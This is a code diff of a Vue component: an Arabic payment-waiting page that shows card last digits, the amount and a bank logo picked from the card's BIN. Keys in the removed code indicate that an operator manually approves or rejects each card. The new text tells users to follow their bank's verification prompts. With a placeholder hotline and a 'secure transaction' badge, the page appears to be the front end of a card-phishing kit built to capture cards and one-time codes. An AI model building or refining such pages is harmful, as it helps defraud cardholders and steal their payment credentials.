@@ -1,162 +1,109 @@
 <template>
-    <div class="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 flex flex-col items-center justify-center py-4 sm:py-6 px-3 sm:px-4"
+    <div class="min-h-screen bg-slate-50 flex flex-col items-center justify-center py-6 sm:py-10 px-4 relative overflow-hidden"
         dir="rtl">
-        <div class="bg-white rounded-2xl shadow-lg border border-slate-100 overflow-hidden w-full"
-            style="max-width: 420px">
+        <!-- Subtle Saudi map background -->
+        <img :src="bannerBg" alt="" aria-hidden="true"
+            class="pointer-events-none absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] sm:w-[750px] select-none"
+            style="opacity: 0.5" />
 
-            <!-- Header -->
-            <div class="bg-gradient-to-l from-primary to-blue-700 py-5 sm:py-6 px-4 text-center">
-                <div class="mb-4">
-                    <!-- Animated Loading Icon -->
-                    <div class="relative inline-flex">
-                        <div class="absolute inset-0 bg-white opacity-20 rounded-full animate-ping"></div>
-                        <div class="relative bg-white rounded-full p-4">
-                            <svg class="w-10 h-10 sm:w-12 sm:h-12 text-primary animate-pulse" fill="none"
-                                stroke="currentColor" viewBox="0 0 24 24">
+        <div class="relative bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden w-full"
+            style="max-width: 440px">
+
+            <!-- Bank Logo -->
+            <div v-if="bankLogo"
+                class="absolute top-4 left-4 z-10 bg-white/90 backdrop-blur-sm rounded-lg px-2.5 py-1 border border-slate-200 shadow-sm">
+                <img :src="bankLogo" alt="Bank logo" class="h-5 sm:h-6 object-contain" />
+            </div>
+
+            <!-- Main Content -->
+            <div class="px-5 sm:px-8 pt-10 sm:pt-12 pb-6 sm:pb-8 text-center">
+
+                <!-- Spinner -->
+                <div class="mb-5">
+                    <div class="relative inline-flex items-center justify-center w-16 h-16">
+                        <svg class="w-16 h-16 animate-spin text-primary" viewBox="0 0 50 50" fill="none">
+                            <circle class="opacity-20" cx="25" cy="25" r="20" stroke="currentColor" stroke-width="4" />
+                            <path class="opacity-80" d="M25 5a20 20 0 0117.32 10" stroke="currentColor" stroke-width="4" stroke-linecap="round" />
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Title -->
+                <h1 class="text-xl sm:text-2xl font-bold text-foreground mb-2">جارٍ معالجة عملية الدفع</h1>
+                <p class="text-sm sm:text-base text-slate-600">يتم الآن تأكيد العملية، يرجى الانتظار وعدم إغلاق الصفحة</p>
+
+                <!-- Bank Verification Notice -->
+                <div class="mt-6 bg-sky-50 border border-sky-200 rounded-xl p-4">
+                    <div class="flex items-start gap-3">
+                        <div class="w-9 h-9 rounded-full bg-sky-100 flex items-center justify-center shrink-0">
+                            <svg class="w-4.5 h-4.5 text-sky-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                             </svg>
+                        </div>
+                        <div class="text-right flex-1">
+                            <p class="text-sm font-semibold text-sky-800 mb-1">توثيق العملية</p>
+                            <p class="text-xs sm:text-sm text-sky-700 leading-relaxed">
+                                قد يتطلب البنك التحقق من العملية عبر وسيلة التوثيق المعتادة لديك. يُرجى متابعة تعليمات البنك لإكمال الدفع.
+                            </p>
                         </div>
                     </div>
                 </div>
-                <h1 class="text-white text-lg sm:text-xl font-bold">
-                    {{ t( 'verification.paymentWaiting.title' ) }}
-                </h1>
-                <p class="text-blue-100 text-sm mt-2">
-                    {{ t( 'verification.paymentWaiting.reviewingCard' ) }}
-                </p>
-            </div>
-
-            <!-- Content -->
-            <div class="p-4 sm:p-6 md:p-8 space-y-5 sm:space-y-6">
-
-                <!-- Status: Pending -->
-                <div v-if="paymentStatus === 'pending'" class="text-center">
-                    <div
-                        class="inline-flex items-center gap-2 bg-amber-50 text-amber-700 border border-amber-200 rounded-full px-4 py-2 text-sm font-medium">
-                        <div class="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></div>
-                        <span>{{ t( 'verification.paymentWaiting.underReview' ) }}</span>
-                    </div>
-                    <p class="mt-4 text-sm text-muted">
-                        {{ t( 'verification.paymentWaiting.waitingAdmin' ) }}
-                    </p>
-                </div>
 
                 <!-- Status: Approved -->
-                <div v-else-if="paymentStatus === 'approved'" class="text-center">
+                <div v-if="paymentStatus === 'approved'" class="mt-6">
                     <div
-                        class="inline-flex items-center gap-2 bg-green-50 text-green-700 border border-green-200 rounded-full px-4 py-2 text-sm font-medium mb-4">
+                        class="inline-flex items-center gap-2 bg-green-50 text-green-700 border border-green-200 rounded-full px-4 py-2 text-sm font-medium">
                         <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                             <path fill-rule="evenodd"
                                 d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                                 clip-rule="evenodd" />
                         </svg>
-                        <span>{{ t( 'verification.paymentWaiting.approved' ) }}</span>
+                        <span>تمت الموافقة</span>
                     </div>
-                    <p class="text-sm text-muted">
-                        {{ t( 'verification.paymentWaiting.approvedMessage' ) }}
-                    </p>
+                    <p class="text-sm text-muted mt-2">جاري التحويل...</p>
                 </div>
 
                 <!-- Status: Rejected -->
-                <div v-else-if="paymentStatus === 'rejected'" class="text-center">
+                <div v-else-if="paymentStatus === 'rejected'" class="mt-6">
                     <div
-                        class="inline-flex items-center gap-2 bg-red-50 text-destructive border border-red-200 rounded-full px-4 py-2 text-sm font-medium mb-4">
+                        class="inline-flex items-center gap-2 bg-red-50 text-destructive border border-red-200 rounded-full px-4 py-2 text-sm font-medium">
                         <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                             <path fill-rule="evenodd"
                                 d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                                 clip-rule="evenodd" />
                         </svg>
-                        <span>{{ t( 'verification.paymentWaiting.rejected' ) }}</span>
+                        <span>تم الرفض</span>
                     </div>
-                    <p class="text-sm text-muted mb-2">
-                        {{ friendlyRejectionReason || t( 'verification.paymentWaiting.rejectedMessage' ) }}
+                    <p class="text-sm text-muted mt-2">
+                        {{ friendlyRejectionReason || 'لم تتم الموافقة على العملية' }}
                     </p>
-                    <p class="text-xs text-slate-400">
-                        {{ t( 'verification.paymentWaiting.redirectingPayment' ) }}
-                    </p>
+                    <p class="text-xs text-slate-400 mt-1">جاري إعادتك لصفحة الدفع...</p>
                 </div>
 
-                <!-- Card Details Summary -->
-                <div v-if="cardLast4" class="bg-slate-50 rounded-xl p-4 text-sm text-slate-700 space-y-2">
-                    <h3 class="text-sm font-semibold text-foreground mb-3">
-                        {{ t( 'verification.paymentWaiting.cardDetails' ) }}
-                    </h3>
-                    <div class="flex justify-between items-center">
-                        <span class="text-muted">{{ t( 'verification.paymentWaiting.cardNumber' ) }}</span>
-                        <span class="font-bold ltr-nums" dir="ltr">**** **** **** {{ cardLast4 }}</span>
-                    </div>
-                    <div v-if="cardHolder" class="flex justify-between items-center">
-                        <span class="text-muted">{{ t( 'verification.paymentWaiting.cardHolder' ) }}</span>
-                        <span class="font-bold uppercase">{{ cardHolder }}</span>
-                    </div>
-                    <div v-if="totalAmount > 0" class="flex justify-between items-center">
-                        <span class="text-muted">{{ t( 'verification.paymentWaiting.amount' ) }}</span>
-                        <span class="font-bold text-primary">
-                            <SarIcon className="size-3 inline-block fill-primary" />
-                            {{ formattedAmount }}
-                        </span>
-                    </div>
-                </div>
-
-                <!-- Tip Box -->
-                <div class="bg-blue-50 border border-blue-100 rounded-xl p-4">
-                    <div class="flex gap-3">
-                        <svg class="w-5 h-5 text-primary flex-shrink-0 mt-0.5" fill="currentColor"
-                            viewBox="0 0 20 20">
-                            <path fill-rule="evenodd"
-                                d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
-                                clip-rule="evenodd" />
-                        </svg>
-                        <div class="text-sm text-blue-800">
-                            <p class="font-semibold mb-1">{{ t( 'verification.paymentWaiting.tip' ) }}</p>
-                            <p class="text-xs">{{ t( 'verification.paymentWaiting.tipMessage' ) }}</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Trust Badges & Payment Logos -->
-                <div class="pt-4 border-t border-slate-200">
-                    <TrustBadges variant="inline" class="mb-4" />
-                    <p class="text-center text-muted text-xs sm:text-sm mb-3">
-                        {{ t( 'common.paymentBy' ) }}
-                    </p>
-                    <div class="flex items-center justify-center gap-3 sm:gap-4">
-                        <img :src="visaLogo" alt="Visa"
-                            class="h-[16px] sm:h-[20px] w-auto" width="50" height="20" />
-                        <img :src="mcLogo" alt="MasterCard"
-                            class="h-[16px] sm:h-[20px] w-auto" width="32" height="20" />
-                        <img :src="madaLogo" alt="Mada"
-                            class="h-[16px] sm:h-[20px] w-auto" width="50" height="20" />
-                    </div>
+                <!-- Card Summary -->
+                <div v-if="cardLast4" class="mt-6 space-y-1 text-sm">
+                    <p class="text-slate-500">البطاقة المنتهية بـ <span class="font-bold text-foreground ltr-nums" dir="ltr">{{ cardLast4 }}</span></p>
+                    <p class="text-slate-500">المبلغ: <span class="font-bold text-primary ltr-nums">{{ formattedAmount }}</span> <SarIcon className="size-2.5 fill-primary inline-block" /></p>
                 </div>
             </div>
 
             <!-- Footer -->
-            <div class="bg-slate-50 border-t border-slate-100 px-4 py-3 text-center">
-                <p class="text-xs text-muted">
-                    {{ t( 'verification.paymentWaiting.waitingReview' ) }}
-                </p>
+            <div class="border-t border-slate-100 px-5 py-3 flex items-center justify-center gap-2 text-slate-400">
+                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
+                <span class="text-xs">معاملة آمنة ومشفرة</span>
             </div>
         </div>
 
-        <!-- Help Section -->
-        <div class="mt-4 sm:mt-6 text-center px-4">
-            <p class="text-xs sm:text-sm text-muted">
-                {{ t( 'common.contactUsIfProblem' ) }}
-                <a href="tel:920000000" class="text-secondary font-bold hover:underline text-sm sm:text-base mr-1">
-                    920000000
-                </a>
+        <!-- Help -->
+        <div class="mt-5 text-center">
+            <p class="text-xs text-muted">
+                للمساعدة أو الاستفسار:
+                <a href="tel:920000000" class="text-secondary font-bold hover:underline mr-1">920000000</a>
             </p>
-        </div>
-
-        <!-- Security Badge -->
-        <div class="mt-3 sm:mt-4 flex items-center justify-center gap-2 text-slate-400">
-            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-            <span class="text-xs">{{ t( 'common.secureTransaction' ) }}</span>
         </div>
     </div>
 </template>
@@ -173,11 +120,10 @@ import { getCardStatus } from '@/api/paymentApi';
 import logger from '@/utils/logger';
 import { safeRedirect } from '@/utils/safeRedirect';
 import SarIcon from '@/components/SarIcon.vue';
-import TrustBadges from '@/components/ui/TrustBadges.vue';
 import { getReasonLabel } from '@/constants/rejectionReasons';
-import visaLogo from '../../../images/logo/summary_logo/download (1).png';
-import mcLogo from '../../../images/logo/summary_logo/download2.png';
-import madaLogo from '../../../images/logo/summary_logo/download3.png';
+import { BANK_LOGOS } from '@/constants/bankLogos';
+import { detectBankFromBin } from '@/utils/bankDetector';
+import bannerBg from '../../../images/banners/banner-motor-bg-en.webp';
 
 const { t } = useI18n();
 const router = useRouter();
@@ -190,8 +136,15 @@ const { context, resolveCustomerIp } = usePayment();
 const _sessionId = computed( () => context.sessionId || '' );
 const customerIp = ref( context.customerIp || '' );
 const cardLast4 = computed( () => context.cardLast4 || '****' );
-const cardHolder = computed( () => context.cardHolder || '' );
+const _cardHolder = computed( () => context.cardHolder || '' );
 const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );
+
+const bankLogo = computed( () =>
+{
+    // Prefer backend-resolved bank code; fall back to client-side BIN detection
+    const key = context.bankCode || detectBankFromBin( context.cardBin || '' );
+    return key && BANK_LOGOS[key] ? BANK_LOGOS[key] : null;
+} );
 
 const formattedAmount = computed( () =>
 {
